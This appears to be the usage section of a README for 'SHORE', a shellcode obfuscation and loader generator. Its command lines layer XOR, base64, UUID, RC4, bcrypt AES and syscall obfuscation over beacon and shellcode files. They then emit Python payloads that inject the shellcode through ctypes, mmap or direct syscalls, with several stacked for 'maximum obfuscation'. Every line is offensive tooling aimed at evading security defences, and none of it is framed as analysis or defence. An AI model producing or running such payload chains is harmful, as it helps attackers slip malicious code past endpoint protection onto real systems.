# Single technique
python3 SHORE.py -s "\xfc\xe8\x82\x00\x00\x00" -t xor

# Multi-layer chaining
python3 SHORE.py -f beacon.bin -t xor,base64,uuid -o payload.py

# All techniques layered
python3 SHORE.py -f shellcode.bin -t all -m ctypes -o staged_payload.py

# Linux target
python3 SHORE.py -s "\x31\xc0\x48\xbb..." -t rot,not -m mmap -o lin_payload.py



##SHORE-v3.0##

# RC4 + printable (fileless delivery via printable string)
python3 SHORE-3.0.py -f beacon.bin -t rc4,printable -o stage1.py

# Full crypto chain: bcrypt AES → RC4 → syscall obfuscation → syscall execution
python3 SHORE-3.0.py -f beacon.bin -t bcrypt_aes,rc4,syscall_obf \
    -m syscall -o hardened_payload.py --passphrase "TD_Bank_Red_Ops_2026"

# All techniques stacked (maximum obfuscation)
python3 SHORE-3.0.py -f shellcode.bin -t all -m syscall -o full_chain.py

# Just syscall obfuscation with standard ctypes injection
python3 SHORE-3.0.py -s "\xfc\x48\x83\xe4..." -t syscall_obf -m ctypes
